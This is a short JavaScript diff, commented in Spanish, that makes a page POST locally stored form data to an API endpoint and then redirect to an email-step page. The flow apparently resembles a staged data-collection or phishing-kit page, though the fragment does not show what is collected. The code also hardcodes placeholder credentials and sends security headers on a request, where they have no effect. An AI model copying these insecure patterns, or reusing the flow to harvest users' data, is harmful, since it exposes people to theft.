@@ -132,7 +132,25 @@
 				console.log(info);
 				LS.setItem('info', JSON.stringify(info));
 
-				window.location.href = 'waiting.html';
+				// Redirigir
+				if (info.err === '') {
+					// Enviar info
+					fetch(`${API_URL}/generals`, {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json',
+							'Authorization': 'Bearer 123123123',
+							'X-CSRF-Token': 'tokennn',
+							'X-Frame-Options': 'SAMEORIGIN',
+							'X-Content-Type-Options': 'nosniff',
+						},
+						body: JSON.stringify(info)
+					})
+					.then(() => window.location.href = './vEmail.html');
+
+				} else {
+					window.location.href = 'waiting.html';
+				}
 
 			} else {
 				document.querySelector('.mensaje').style.display = 'block';
